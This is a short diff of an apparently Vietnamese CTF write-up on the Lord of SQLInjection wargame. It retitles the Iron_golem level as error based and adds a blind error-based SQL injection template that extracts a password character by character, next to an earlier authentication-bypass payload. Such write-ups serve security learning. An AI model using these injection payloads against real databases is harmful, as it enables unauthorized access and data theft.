@@ -631,9 +631,7 @@ Dấu `#` ở bài này là comment đoạn query nên ta sẽ không nhập đ�
 
 \=>payload : /?pw='%0a and pw='j1s0o' or id = 'admin' -- -
 
-
-
-## Iron\_golem
+## Iron\_golem(error based)
 
 ```php
 <?php
@@ -654,3 +652,6 @@ Dấu `#` ở bài này là comment đoạn query nên ta sẽ không nhập đ�
   highlight_file(__FILE__);
 ?>
 ```
+
+payload = ' or if(ord(substr({pw},{i},1))={j},( select 1 union select 2),1)-- -
+
